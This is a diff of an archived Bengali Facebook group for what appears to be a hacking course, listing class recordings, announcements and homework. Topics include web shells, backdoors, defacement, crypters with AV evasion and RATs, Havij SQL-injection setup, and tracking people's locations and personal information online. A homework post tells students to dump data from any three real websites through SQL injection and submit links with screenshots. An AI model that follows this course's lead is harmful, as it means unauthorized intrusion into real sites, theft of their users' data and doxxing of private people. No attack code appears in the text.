-## entry-90 · Burp Suite — Proxy ও Intruder
+## Class 8 — Burp Suite — Proxy ও Intruder
 
-Category: recordings | Date: 2026-08-16
-
-### Preserved post text
+Date: 2026-08-16 · Category: recordings · ID: entry-90
 
 ক্লাস রেকর্ড
 ১৬/০৮/২০২৬
 10Ue96SrqLDLBGtvimsGi2YM_al5rRJHf
 
-Verified video: https://youtu.be/oJIRROzXEZI
+- [Resource](https://drive.google.com/file/d/10Ue96SrqLDLBGtvimsGi2YM_al5rRJHf/view?usp=sharing)
 
-## entry-99 · WebShell, Backdoor ও Deface Page
+## Class 9 — WebShell, Backdoor ও Deface Page
 
-Category: recordings | Date: 2026-08-21
-
-### Preserved post text
+Date: 2026-08-21 · Category: recordings · ID: entry-99
 
 ক্লাস রেকর্ড
 ২১/০৮/২০২৬
 1thMVV8Nubt8mt8091BU9gvcRUNqoSB3J
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1632498915119364
+- [Resource](https://drive.google.com/file/d/1thMVV8Nubt8mt8091BU9gvcRUNqoSB3J/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632498915119364)
 
-## entry-105 · আসুন জেনে নেই-০৭
+## আসুন জেনে নেই-০৭
 
-Category: information | Date: 2026-08-23
-
-### Preserved post text
+Date: 2026-08-23 · Category: information · ID: entry-105
 
 আসুন জেনে নেই-০৭
 Shell
@@ -973,101 +925,94 @@ Defacement
 ডিফেস এর অনেক মানে আছে তবে ওয়েব হ্যাকিং এ ডিফেস বলতে বোঝায় সাইট এর এডমিন অথবা অন্য কোনো ভাবে এক্সেস করে নিজের পদচিহ্ন বা স্থান জানান দেওয়া। মূলত সাইটের কোনো কনটেন্টের পরিবর্তন কিংবা কোনো কনটেন্টের পরিবর্তে নিজের কোনো কনটেন্ট দেখানোর মাধ্যম কে বোঝায়। আরো সহজ ভাবে বলতে গেলে:
 ডিফেইস এর শাব্দিক অর্থ বিকৃত। হ্যাকিংয়ের ক্ষেত্রেও এর অর্থ অনেকটা সেরকম। কোনো সাইট হ্যাক হয়ে যাওয়ার একটি প্রমাণ হলো ডিফেইস।ওয়েবসাইট ডিফেইসমেন্ট বা ডিফেইস হলো এমন একধরনের আক্রমনাত্মক প্রদর্শন পদ্ধতি যার ফলে কোনো ওয়েবসাইটের আসল ওয়েবপেইজটি হ্যাকার তার নিজস্ব ওয়েবপেইজ দ্বারা প্রতিস্থাপিত করে।আমরা প্রায় দেখে থাকি হ্যাকাররা কোনো সাইট হ্যাক করে ওই সাইটের ওয়েবপেইজে প্রদর্শন করে Hacked by CYBER-71 ! এই প্রক্রিয়াটিই হলো ডিফেইস।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1632441241791798
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632441241791798)
 
-## entry-107 · File Upload Vulnerabilities
+## Class 10 — File Upload Vulnerabilities
 
-Category: recordings | Date: 2026-08-23
-
-### Preserved post text
+Date: 2026-08-23 · Category: recordings · ID: entry-107
 
 ক্লাস রেকর্ড
 ২৩/০৮/২০২৬
 1MndRtXOopfUT7SjY5B6QX6VEjxxrQLGZ
 
-## entry-115 · PortSwigger Labs — SQLi, XSS ও File Upload
+- [Resource](https://drive.google.com/file/d/1MndRtXOopfUT7SjY5B6QX6VEjxxrQLGZ/view?usp=sharing)
 
-Category: recordings | Date: 2026-08-29
+## Class 11 — PortSwigger Labs — SQLi, XSS ও File Upload
 
-### Preserved post text
+Date: 2026-08-29 · Category: recordings · ID: entry-115
 
 ক্লাস রেকর্ড
 ২৯/০৮/২০২৬
 1wTdg47l6M8J9y4Lmzi6GHyaZMP-0zbKp
 
-## entry-112 · Acunetix — Scanner Setup ও Reports
+- [Resource](https://drive.google.com/file/d/1wTdg47l6M8J9y4Lmzi6GHyaZMP-0zbKp/view?usp=sharing)
 
-Category: recordings | Date: 2026-08-30
+## Class 12 — Acunetix — Scanner Setup ও Reports
 
-### Preserved post text
+Date: 2026-08-30 · Category: recordings · ID: entry-112
 
 ক্লাস রেকর্ড
 ৩০/০৮/২০২৬
 1YUQJTOVvRJ6-8UwINj71Jo5pZVq21FGp
 
-## entry-117 · Batch Scripting
+- [Resource](https://drive.google.com/file/d/1YUQJTOVvRJ6-8UwINj71Jo5pZVq21FGp/view?usp=sharing)
 
-Category: recordings | Date: 2026-09-04
+## Class 13 — Batch Scripting
 
-### Preserved post text
+Date: 2026-09-04 · Category: recordings · ID: entry-117
 
 ক্লাস রেকর্ড
 ০৪/০৯/২০২৬
 10Ut65sMkUshm54yw4KjbputZMWY6uCfJ
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1644380957264493
+- [Resource](https://drive.google.com/file/d/10Ut65sMkUshm54yw4KjbputZMWY6uCfJ/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1644380957264493)
 
-## entry-122 · Linux Installation ও Virtual Lab Setup
+## Class 14 — Linux Installation ও Virtual Lab Setup
 
-Category: recordings | Date: 2026-09-06
-
-### Preserved post text
+Date: 2026-09-06 · Category: recordings · ID: entry-122
 
 ক্লাস রেকর্ড
 ০৬/০৯/২০২৬
 1fXShf8eUl6Z-eCutvA7GHaS1BcygWDnQ
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1646127127089876
+- [Resource](https://drive.google.com/file/d/1fXShf8eUl6Z-eCutvA7GHaS1BcygWDnQ/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1646127127089876)
 
-## entry-121 · Linux Installation & Virtual Lab Setup
+## Linux Installation & Virtual Lab Setup
 
-Category: tools | Date: 2026-09-07
-
-### Preserved post text
+Date: 2026-09-07 · Category: tools · ID: entry-121
 
 Linux Installation & Virtual Lab Setup
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1646665390369383
+- [Resource](https://drive.google.com/file/d/1tMKC4u2W4LwNXZXlRX93wMH5M7TWBHYT/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1646665390369383)
 
-## entry-124 · Linux Command Line
+## Class 15 — Linux Command Line
 
-Category: recordings | Date: 2026-09-11
-
-### Preserved post text
+Date: 2026-09-11 · Category: recordings · ID: entry-124
 
 ক্লাস রেকর্ড
 ১১/০৯/২০২৬
 1kbSCvxBTMEWRX4wBrjlA0ah2Zw74Fgc8
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1650729253296330
+- [Resource](https://drive.google.com/file/d/1kbSCvxBTMEWRX4wBrjlA0ah2Zw74Fgc8/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1650729253296330)
 
-## entry-126 · Crypter, Antivirus ও RAT Lab
+## Class 16 — Crypter, Antivirus ও RAT Lab
 
-Category: recordings | Date: 2026-09-13
-
-### Preserved post text
+Date: 2026-09-13 · Category: recordings · ID: entry-126
 
 ক্লাস রেকর্ড
 ১৩/০৯/২০২৬
 1x3o6Wk_0OsOq3Mf2d_2xZeSlppM7cvbT
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1652121839823738
+- [Resource](https://drive.google.com/file/d/1x3o6Wk_0OsOq3Mf2d_2xZeSlppM7cvbT/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1652121839823738)
 
-## entry-2 · INFORMATIONAL POST-04
+## INFORMATIONAL POST-04
 
-Category: information | Date: 2026-09-16
-
-### Preserved post text
+Date: 2026-09-16 · Category: information · ID: entry-2
 
 INFORMATIONAL POST-04
 আমাদের গত ক্লাসে
@@ -1084,86 +1029,81 @@ Research PDF
 রিসোর্সগুলো দিয়ে প্র্যাকটিস করার সময় কোনো জায়গায় বুঝতে অসুবিধা হলে অবশ্যই কমেন্টে জানাবেন, উত্তর দেওয়ার চেষ্টা করবো।
 ধন্যবাদ!
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1654330032936252
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1654330032936252)
 
-## entry-132 · LFI ও Web Server Security Lab
+## Class 17 — LFI ও Web Server Security Lab
 
-Category: recordings | Date: 2026-09-18
-
-### Preserved post text
+Date: 2026-09-18 · Category: recordings · ID: entry-132
 
 ক্লাস রেকর্ড
 ১৮/০৯/২০২৬
 1EqmHoZaM6FRFG66-eSE70LODAIp30FS0
 
-## entry-130 · LFI/LFD Basics
+- [Resource](https://drive.google.com/file/d/1EqmHoZaM6FRFG66-eSE70LODAIp30FS0/view?usp=sharing)
 
-Category: classes | Date: 2026-09-19
+## LFI/LFD Basics
 
-### Preserved post text
+Date: 2026-09-19 · Category: classes · ID: entry-130
 
 LFI/LFD Basics
 0:00 / 16:36
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1656477746054814
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1656477746054814)
 
-## entry-134 · Kali Tools Setup — Java, Go ও Burp Suite
+## Class 18 — Kali Tools Setup — Java, Go ও Burp Suite
 
-Category: recordings | Date: 2026-09-20
-
-### Preserved post text
+Date: 2026-09-20 · Category: recordings · ID: entry-134
 
 ক্লাস রেকর্ড
 ২০/০৯/২০২৬
 1h3MPDfRtZKwHY3sBVOSQ80Nb7uArNINe
 
-## entry-142 · Advanced LFI, Path Traversal ও RCE Lab
+- [Resource](https://drive.google.com/file/d/1h3MPDfRtZKwHY3sBVOSQ80Nb7uArNINe/view?usp=sharing)
 
-Category: recordings | Date: 2026-09-25
+## Class 19 — Advanced LFI, Path Traversal ও RCE Lab
 
-### Preserved post text
+Date: 2026-09-25 · Category: recordings · ID: entry-142
 
 ক্লাস রেকর্ড
 ২৫/০৯/২০২৬
 1DsJbH8zzxN5aC8YI7CXCiVC_3wKmsodt
 
-## entry-145 · WordPress, phpMyAdmin ও Elementor
+- [Resource](https://drive.google.com/file/d/1DsJbH8zzxN5aC8YI7CXCiVC_3wKmsodt/view?usp=sharing)
 
-Category: recordings | Date: 2026-09-27
+## Class 20 — WordPress, phpMyAdmin ও Elementor
 
-### Preserved post text
+Date: 2026-09-27 · Category: recordings · ID: entry-145
 
 ক্লাস রেকর্ড
 ২৭/০৯/২০২৬
 1WT64w91wmge9FczUis8I-ZRVXgR2cT3c
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1664560601913195
+- [Resource](https://drive.google.com/file/d/1WT64w91wmge9FczUis8I-ZRVXgR2cT3c/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1664560601913195)
 
-## entry-147 · Recon — VPS ও Shodan Setup
+## Class 21 — Recon — VPS ও Shodan Setup
 
-Category: recordings | Date: 2026-10-02
-
-### Preserved post text
+Date: 2026-10-02 · Category: recordings · ID: entry-147
 
 ক্লাস রেকর্ড
 ০২/১০/২০২৬
 1FWVj_OVTEqqlDnYHV35e-1krbMS_RXGj
 
-## entry-1 · Topic: Malware Removal Live Project (Part 1)
+- [class-2026-10-02.mp4](https://drive.google.com/file/d/1QtIQkLLqMQbIQWksRcWVzYcJ-9pKymBu/view)
+- [Resource](https://drive.google.com/file/d/1FWVj_OVTEqqlDnYHV35e-1krbMS_RXGj/view?usp=sharing)
 
-Category: information | Date: not verified
+## Topic: Malware Removal Live Project (Part 1)
 
-### Preserved post text
+Date: unverified · Category: information · ID: entry-1
 
 Topic: Malware Removal Live Project (Part 1)
 Class link :
 Class topic will start 9:45 PM
 
-## entry-17 · আসসালামু আলাইকুম। কেমন আছেন সবাই?
 
-Category: information | Date: not verified
+## আসসালামু আলাইকুম। কেমন আছেন সবাই?
 
-### Preserved post text
+Date: unverified · Category: information · ID: entry-17
 
 আসসালামু আলাইকুম। কেমন আছেন সবাই?
 আমি তানজিম আল ফাহিম, আপনাদের কোর্সের প্রধান প্রশিক্ষক হিসেবে দায়িত্ব পালন করবো ইনশাআল্লাহ। আমি ছাড়াও ২১ জনের অভিজ্ঞ একটি টীম এবং সম্মানিত বিশেষজ্ঞ এবং দেশসেরা প্রশিক্ষকবৃন্দরা আপনাদের কোর্সের সাথে পুরো সময়কাল ধরেই থাকবেন।
@@ -1177,26 +1117,22 @@ Category: information | Date: not verified
 
 ক্লাসে দেখা হচ্ছে ইনশাআল্লাহ। ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1601890488180207
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1601890488180207)
 
-## entry-18 · আর এক ঘন্টা পরেই
+## আর এক ঘন্টা পরেই
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-18
 
 আর এক ঘন্টা পরেই
 রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
 অরিয়েন্টেশন ক্লাস লিংক সরাসরি গ্রুপেই শেয়ার করা হবে। এখানেই সমস্ত দিক নির্দেশনা প্রদান করা হবে। সুতরাং, নির্ধারিত সময়ের ১০ মিনিট আগে শুধুমাত্র গ্রুপে চলে আসবেন।
 ক্লাসে দেখা হচ্ছে ইনশাআল্লাহ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604060137963242
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604060137963242)
 
-## entry-19 · আজকে রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
+## আজকে রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-19
 
 আজকে রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
 প্রথম অরিয়েন্টেশন ক্লাস হিসেবে সবাই অন্তত ১০ মিনিট পুর্বেই গ্রুপে উপস্থিত থাকবেন।
@@ -1204,30 +1140,26 @@ Category: information | Date: not verified
 সুতরাং, সর্ব প্রথম গ্রুপে চলে আসবেন সবাই। গ্রুপ থেকেই ক্লাস এবং সকল দিক নির্দেশনা দেওয়া হবে অরিয়েন্টেশন ক্লাসের।
 ক্লাসে দেখা হচ্ছে, ইনশাআল্লাহ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1603860857983170
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1603860857983170)
 
-## entry-21 · অরিয়েন্টেশন ক্লাসের পরবর্তী নির্দেশনা
+## অরিয়েন্টেশন ক্লাসের পরবর্তী নির্দেশনা
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-21
 
 অনেকের জন্য একেবারে নতুন হলেও আপনাদের সাথে লাইভ orientation class করে খুব ভালো লাগলো। খুবই মজার এবং enjoyable ছিলো। আবার কথা হচ্ছে ইনশাআল্লাহ্‌।
 ধন্যবাদ সকল এডমিন এবং মডারেটরদের আমার সাথে ক্লাসে সহায়তা করার জন্য। শুভ রাত্রি।
 হোমওয়ার্ক কিভাবে করবেন, ক্লাস রেকর্ড সহ সব কিছু গ্রুপে দিয়ে দেওয়া হবে। কোন প্রশ্ন থাকলে পোষ্টে জানান, আমি উত্তর দিয়ে দিচ্ছি। ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604185577950698
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604185577950698)
 
-## entry-22 · Orientation Class: B66 Delta
+## Orientation Class: B66 Delta
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: 2026-07-19 · Category: documents · ID: entry-22
 
 ডিরেক্ট ক্লাস রিসোর্স লিংক
 Orientation Class: B66 Delta
 
-### Preserved note
+### Notes
 
 Sec 1:
 —-------------------
@@ -1394,34 +1326,29 @@ Attendance form: https://forms.gle/49vegvDWTkNjdKB46
 ৩। গুগল ফর্ম থেকে উপস্থিতি দিয়ে দিন। সেখানে আপনার তথ্যগুলো দিয়ে সাবমিট করলে স্বয়ংক্রিয় ভাবেই attendance হয়ে যাবে এবং আপনাকে কনফার্মেশন মেসেজ দেখাবে।
 ৪। উপস্থিতি দেওয়া হলে ৯ টা ৪৫ মিনিট মানে ক্লাস শুরু হওয়া পর্যন্ত অপেক্ষা করুন। ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604086317960624
+- [Resource](https://docs.google.com/document/d/12U7ODuPdJCVEfEuIVt27d57fDxhtskkkT6lBZbohD2M/edit)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604086317960624)
 
-## entry-23 · আসুন দেখে নেই যেভাবে আমরা আমাদের হোমওয়ার্কের জন্য পিডিএফ তৈরি করব!
+## আসুন দেখে নেই যেভাবে আমরা আমাদের হোমওয়ার্কের জন্য পিডিএফ তৈরি করব!
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-23
 
 আসুন দেখে নেই যেভাবে আমরা আমাদের হোমওয়ার্কের জন্য পিডিএফ তৈরি করব!
 0:00 / 3:35
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604209217948334
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604209217948334)
 
-## entry-24 · Basic SQLI practice video
+## Basic SQLI practice video
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-24
 
 Basic SQLI practice video
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604211184614804
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604211184614804)
 
-## entry-26 · আমাদের পরবর্তী ক্লাসের জন্য উল্লিখিত টুলসগুলো অত্যন্ত গুরুত্বপূর্ণ।
+## আমাদের পরবর্তী ক্লাসের জন্য উল্লিখিত টুলসগুলো অত্যন্ত গুরুত্বপূর্ণ।
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-26
 
 আমাদের পরবর্তী ক্লাসের জন্য উল্লিখিত টুলসগুলো অত্যন্ত গুরুত্বপূর্ণ।
 হ্যাকিং টুলস ইন্সটলেশন সংক্রান্ত নির্দেশনা, নিয়মাবলী এবং টিউটোরিয়াল ভিডিওসহ সকল প্রয়োজনীয় তথ্য PDF ফাইলের মাধ্যমে প্রদান করা হয়েছে। অনুগ্রহ করে PDF ফাইলটি ওপেন করে টুলসগুলো সঠিকভাবে সেটআপ করে নিন।
@@ -1430,13 +1357,12 @@ Category: documents | Date: not verified
 drive.google.com
 Havij-guide.pdf
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604955407873715
+- [Resource](https://drive.google.com/file/d/1nlChC8AnaJohEdDlLf7KDLOmaBg_KYMW/view?usp=drive_link)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604955407873715)
 
-## entry-27 · হেল্প পোস্ট
+## হেল্প পোস্ট
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-27
 
 হেল্প পোস্ট
 গ্রুপে অনেকেই রয়েছেন যাদের সিস্টেমে মাইক্রোসফট অফিস এপ্লিকেশন সেটআপ করা নেই। সেই ক্ষেত্রে তারা গুগল ডকস এর মাধ্যমে হোমওয়ার্ক এর জন্য পিডিএফ ফাইল তৈরি করে ব্যবহার করতে পারেন। এছাড়াও
@@ -1444,50 +1370,43 @@ Category: classes | Date: not verified
 ধন্যবাদ ...
 0:00 / 0:00
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604211724614750
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604211724614750)
 
-## entry-28 · আজকের মত লাইভ সাপোর্টসেশন ক্লোজ হয়ে গিয়েছে। এখনো ক্লাস টপিক রিলেটেড কারো কোন প্রবলেম থেকে থাকলে…
+## আজকের মত লাইভ সাপোর্টসেশন ক্লোজ হয়ে গিয়েছে। এখনো ক্লাস টপিক রিলেটেড কারো কোন প্রবলেম থেকে থাকলে…
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-28
 
 আজকের মত লাইভ সাপোর্টসেশন ক্লোজ হয়ে গিয়েছে। এখনো ক্লাস টপিক রিলেটেড কারো কোন প্রবলেম থেকে থাকলে কমেন্টে জানাতে পারেন আমরা সবাই মিলে হেল্প করার চেষ্টা করব। পাশাপাশি আপনি টপিকটা ভালোভাবে বুঝে থাকলে আপনার ব্যাচমেট কেও হেল্প করতে পারেন এর উপর মার্কস ও রয়েছে।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1604961474539775
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604961474539775)
 
-## entry-30 · Extra remote support session
+## Extra remote support session
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-30
 
 Extra remote support session
 এখন অব্দি যারা হাবিজ সেটআপ করেননি তারা ক্লাসের পূর্বে রিমোট সাপোর্ট নিয়ে অ্যাপ্লিকেশনটা সেটআপ করে নিন। রিমোট সাপোর্টের জন্য
 ULTRAVIEWER
-অ্যাপ্লিকেশনটি ডাউনলোড করুন এবং আইডি পাসওয়ার্ড কমেন্টে দিন।
+অ্যাপ্লিকেশনটি ডাউনলোড করুন এবং ব্যক্তিগত নিরাপদ যোগাযোগে সহায়তা নিন।
 এপ্লিকেশন ডাউনলোড লিংক কমেন্টে পেয়ে যাবেন
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1605753791127210
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1605753791127210)
 
-## entry-31 · শুধুমাত্র Mac ডিভাইস এর জন্য
+## শুধুমাত্র Mac ডিভাইস এর জন্য
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-31
 
 শুধুমাত্র Mac ডিভাইস এর জন্য
 Havij guide
 drive.google.com
 Havij Guide for Mac.pdf
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1605748737794382
+- [Resource](https://drive.google.com/file/d/11I48kL1Y7kWJmr3pWW2mPfw5vlMMcvN0/view?usp=drive_link)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1605748737794382)
 
-## entry-32 · হোমওয়ার্ক আপডেট:
+## হোমওয়ার্ক আপডেট:
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-32
 
 হোমওয়ার্ক আপডেট:
 যাদের হোম ওয়ার্ক এপ্রুভ হয়নি তারা প্যানেলে গিয়ে ডিক্লাইনের উপর ক্লিক করলেই কারণ জানতে পারবেন। যেহেতু আপনারা এই প্রথম সার্ভারে হোমওয়ার্ক সাবমিট করছেন তাই আপনাদের প্রবলেমগুলো এখানে দিয়ে দেওয়া হলো। এগুলো সল্ভ করে পুনরায় সাবমিট করুন ধন্যবাদ!
@@ -1508,79 +1427,68 @@ Md Rashaduzzaman (rpalash2016) >> আপনি পুনরায় হোম �
 Faysal khan (fayshalkhan701bn) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
 Akibul islam jishan (skyblue671761) >> আপনার পিডিএফ ফাইলটির শেয়ার এক্সেস দেননি
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1606489351053654
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1606489351053654)
 
-## entry-33 · শুধুমাত্র ম্যাকবুকে টুলস সেটআপ সংক্রান্ত সাপোর্ট পোস্টে
+## শুধুমাত্র ম্যাকবুকে টুলস সেটআপ সংক্রান্ত সাপোর্ট পোস্টে
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-33
 
 শুধুমাত্র ম্যাকবুকে টুলস সেটআপ সংক্রান্ত সাপোর্ট পোস্টে
 সময়: ৭-৯ টা পর্যন্ত
-To join the video meeting, click this link: https://meet.google.com/web-mhsv-ysg
-Otherwise, to join by phone, dial +1 402-442-0171 and enter this PIN: 732 872 091#
+To join the video meeting, click this link: [মিটিং লিংক প্রকাশ করা হয়নি]
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 meet.google.com
 
-## entry-34 · এখনো অব্দি যারা
 
-Category: tools | Date: not verified
+## এখনো অব্দি যারা
 
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-34
 
 এখনো অব্দি যারা
 হাবিজ
 টুলস সেটাপ করতে পারেননি তারা ক্লাস এর পূর্বে সরাসরি সাপোর্ট নিয়ে টুলস সেটাপ করে নিন।
 সাপোর্ট লিংক কমেন্টে।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1607868367582419
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1607868367582419)
 
-## entry-35 · আজকে রাত ৯ টা ৩০ থেকে কিন্তু আপনাদের প্রথম ক্লাস, মনে আছে?
+## আজকে রাত ৯ টা ৩০ থেকে কিন্তু আপনাদের প্রথম ক্লাস, মনে আছে?
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-35
 
 আজকে রাত ৯ টা ৩০ থেকে কিন্তু আপনাদের প্রথম ক্লাস, মনে আছে?
 অরিয়েন্টেশন ক্লাসের মতোই গ্রুপে চলে আসবেন, সকল দিকনির্দেশনা প্রদান করা হবে।
 পাশাপাশি হোমওয়ার্ক এবং টুলস সম্পর্কিত যদি কোন সহায়তা প্রয়োজন হয়, ক্লাসের আগেই চলে আসবেন। সন্ধ্যা ৬ টা থেকে রাত ৯ টা পর্যন্ত one 2one live এক্সট্রা সাপোর্ট সেশন চলবে। গ্রুপেই তথ্য পেয়ে যাবেন। ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1607991684236754
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1607991684236754)
 
-## entry-36 · Extra support session will start from 6:00 PM
+## Extra support session will start from 6:00 PM
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-36
 
 Extra support session will start from 6:00 PM
 Get
 Havij
 tools related support before starting the class. To join the video meeting, click this link:
-Otherwise, to join by phone, dial +1 321-804-6916 and enter this PIN: 378 420 049#
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 meet.google.com
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1607005577668698
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1607005577668698)
 
-## entry-37 · Join for Havij tools related support
+## Join for Havij tools related support
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-37
 
 Join for Havij tools related support
 Closed at 1 AM
 To join the video meeting, click this link:
-Otherwise, to join by phone, dial +1 636-498-4687 and enter this PIN: 204 328 644#
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 meet.google.com
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1608233307545925
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608233307545925)
 
-## entry-38 · ধন্যবাদ সবাইকে, ইন্টারনেট নিয়ে কয়েকজন struggle করলেও খুবই enjoyable একটা সেশন ছিলো আপনাদের সাথে।
+## ধন্যবাদ সবাইকে, ইন্টারনেট নিয়ে কয়েকজন struggle করলেও খুবই enjoyable একটা সেশন ছিলো আপনাদের সাথে।
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-38
 
 ধন্যবাদ সবাইকে, ইন্টারনেট নিয়ে কয়েকজন struggle করলেও খুবই enjoyable একটা সেশন ছিলো আপনাদের সাথে।
 আমাদের পরবর্তী ক্লাস "অনলাইন লোকেশন ট্র‍্যাকিং" এবং অনলাইনের মাধ্যমে কারো তথ্য বের করা।
@@ -1588,20 +1496,18 @@ Category: information | Date: not verified
 দেখা হচ্ছে ক্লাসে, ইনশাআল্লাহ।
 আজকে ১১ টা ৩০ থেকে ১২ টা পর্যন্ত আলাদা একটা one2one support session হচ্ছে। যদি কারো টুলস কিংবা ক্লাস ওয়ার্ক সম্পর্কিত সমস্যা থাকে, সাপোর্ট সেশন থেকে সাপোর্ট নিয়ে নিন। ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1608227137546542
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608227137546542)
 
-## entry-41 · Submit 3 SQLi site link with screenshot...
+## Submit 3 SQLi site link with screenshot...
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-41
 
 Submit 3 SQLi site link with screenshot...
 https://docs.google.com/document/d/129j6c7u1S-e6atUbnlis50Cnpm3qtrHaKP_KSENe_eo/edit?usp=sharing
 docs.google.com
 Submit 3 SQLi site link with screenshot
 
-### Preserved note
+### Notes
 
 Dump the data of any three websites from here
 
@@ -1636,13 +1542,12 @@ Google Dork
 
 Example of homework PDF
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1608246277544628
+- [Resource](https://docs.google.com/document/d/129j6c7u1S-e6atUbnlis50Cnpm3qtrHaKP_KSENe_eo/edit?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608246277544628)
 
-## entry-42 · চলুন কম্পিউটার নিয়ে একটু জেনে আসি!!
+## চলুন কম্পিউটার নিয়ে একটু জেনে আসি!!
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-42
 
 চলুন কম্পিউটার নিয়ে একটু জেনে আসি!!
 File Extension
@@ -1741,18 +1646,16 @@ File Extension
 =! নিচের দুটি ছবিতে জিপ ফাইল ডাবল ক্লিক করে রান করার চেষ্টা করা হচ্ছে! এক্ষেত্রে প্রথমে জিপ ফাইলের উপর রাইট ক্লিক করে এক্সট্র্যাক্ট করতে হবে।
 =! যদি ফাইল নেম এবং এক্সটেনশন দেখা না যায় তবে শেষের ছবিটি লক্ষ্য করুন ভিউ থেকে ফাইল নেম এবং এক্সটেনশন টিক মার্ক দিয়ে নিবেন ধন্যবাদ...!
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1608248120877777
